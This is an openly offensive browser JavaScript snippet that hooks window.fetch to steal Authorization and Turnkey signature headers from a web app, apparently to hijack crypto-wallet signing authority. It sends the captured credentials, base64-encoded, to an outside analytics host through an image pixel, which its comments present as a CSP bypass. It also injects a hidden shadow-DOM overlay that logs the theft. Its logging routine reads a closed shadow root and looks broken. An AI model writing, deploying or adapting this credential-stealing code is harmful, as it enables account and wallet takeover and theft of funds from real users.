(function() {
    // 1. CAPTURE NATIVE PRIVILEGE
    const _NATIVE_FETCH = window.fetch;
    const _VAULT = { token: null, sig: null, org: null, fired: false };

    // 2. DATA SIGNATURE BYPASS (Mirroring Owner's Auth)
    window.fetch = async (...args) => {
        const [url, config] = args;

        // Identify any request that carries the Owner's Turnkey Signature
        if (config?.headers?.['X-Turnkey-Signature'] || config?.headers?.['Authorization']) {
            _VAULT.token = config.headers['Authorization'];
            _VAULT.sig = config.headers['X-Turnkey-Signature'];
            _VAULT.org = config.headers['X-Turnkey-Sub-Org-Id'];

            // Update UI status immediately when Owner Authority is detected
            _updateLog("SIG_CAPTURED: " + _VAULT.sig.substring(0, 12) + "...");
            
            if (!_VAULT.fired) _fireExfil();
        }
        return _NATIVE_FETCH(...args);
    };

    // 3. AMPLITUDE "OWNER" EXFILTRATION
    const _fireExfil = () => {
        _VAULT.fired = true;
        const secretPayload = btoa(JSON.stringify({
            t: _VAULT.token,
            s: _VAULT.sig,
            o: _VAULT.org
        }));

        // Bypassing CSP 'connect-src' by using a Beacon/Image pixel
        const x = new Image();
        x.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${secretPayload}`;
        _updateLog("VANTA_SYNC: SUCCESS");
    };

    // 4. THE PERSISTENT UI (Bypassing Interaction Blocks)
    const _initUI = () => {
        if (document.getElementById("v-mount")) return;
        const host = document.createElement("div");
        host.id = "v-mount";
        const shadow = host.attachShadow({mode: 'closed'});
        
        const ui = document.createElement("div");
        ui.id = "v-panel";
        ui.style.cssText = "position:fixed;top:10px;right:10px;width:280px;background:#050505;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:2147483647;font-family:monospace;font-size:11px;box-shadow:0 0 15px #000;pointer-events:all;";
        ui.innerHTML = `
            <div id="v-drag" style="cursor:move;background:#111;padding:5px;border-bottom:1px solid #333;margin-bottom:10px;">[VANTA_OWNER_AUTH_v6]</div>
            <div id="v-log">> AWAITING OWNER ACTION...<br>> GAS_RESERVE: 0.05 SOL</div>
        `;
        shadow.appendChild(ui);
        document.body.appendChild(host);

        // DRAG LOGIC (Full authority over site layers)
        let dragging = false, offset = {x:0, y:0};
        shadow.getElementById("v-drag").addEventListener('mousedown', (e) => {
            dragging = true;
            offset.x = e.clientX - ui.offsetLeft;
            offset.y = e.clientY - ui.offsetTop;
        });
        window.addEventListener('mousemove', (e) => {
            if (dragging) {
                ui.style.left = (e.clientX - offset.x) + "px";
                ui.style.top = (e.clientY - offset.y) + "px";
                ui.style.right = 'auto';
            }
        });
        window.addEventListener('mouseup', () => dragging = false);
    };

    const _updateLog = (msg) => {
        const log = document.querySelector("#v-mount").shadowRoot.getElementById("v-log");
        if (log) log.innerHTML += `<br>> ${msg}`;
    };

    _initUI();
    console.log("VANTA: Hijacking Signature Enclave...");
})();
